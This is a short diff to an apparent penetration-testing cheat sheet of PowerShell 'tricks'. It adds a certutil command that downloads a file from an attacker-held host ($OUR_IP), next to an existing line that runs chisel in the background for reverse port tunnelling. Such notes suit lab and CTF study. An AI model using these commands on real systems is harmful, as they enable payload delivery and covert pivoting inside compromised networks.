@@ -1,6 +1,9 @@
 # Tricks
 
 ```powershell
+# Download files if iwr doesn't work
+certutil.exe -f -urlcache http://$OUR_IP/example.txt example.txt
+
 # Run an executable as a process in the background
 Start-Process -FilePath ".\chisel.exe" -ArgumentList "client 192.168.1.10:8000 R:8888:localhost:8888" -NoNewWindow
 
